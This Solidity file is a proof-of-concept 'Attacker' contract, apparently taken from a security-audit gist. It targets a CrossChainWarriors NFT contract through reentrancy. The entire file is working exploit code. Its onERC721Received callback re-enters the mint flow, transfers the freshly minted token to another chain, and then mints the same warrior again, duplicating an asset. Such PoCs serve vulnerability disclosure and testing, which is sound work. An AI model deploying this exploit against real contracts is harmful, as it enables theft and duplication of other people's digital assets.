// SPDX-License-Identifier: MIT
// Original: https://gist.github.com/m9800/1a9413dd9b486e43c3c787705c6ea85d#file-attacker-md

pragma solidity 0.8.20;

import "./crossChainWarriors.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Attacker is IERC721Receiver {
    // Used to avoid an infinite loop
    bool public _hasReentered;
    // beneficiary of the attack
    address _beneficiary;
    // Warriors address in chain A , ie: where first nft is minted
    CrossChainWarriors internal _contractChainA;
    // Warriors address in chain B, where the nft is going to be transferred via crossChainTransfer;
    CrossChainWarriors internal  _contractChainB;

    uint256 public _chainBId;

    constructor(address contractChainA ,address contractChainB, uint256 chainBId) {
        _beneficiary = msg.sender;
        _contractChainA = CrossChainWarriors(contractChainA);
        _contractChainB = CrossChainWarriors(contractChainB);
        _chainBId = chainBId;
    }


    function attack() public returns(uint256){
        // Mint a warrior in chain A
        return _contractChainA.mint(address(this));
    }


    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external override returns (bytes4){

        if(!_hasReentered){ 
        // Transfer the warrior to chain B 
        _contractChainA.crossChainTransfer(_chainBId, _beneficiary, tokenId);
        // update the variable to avoid an infinite loop
        _hasReentered = true; 
        // Mint  the same warrior again in chain A 
        _contractChainA.mint(_beneficiary);
        }
        // return selector to pass the check performed by _safeMint
        return this.onERC721Received.selector;
    }
}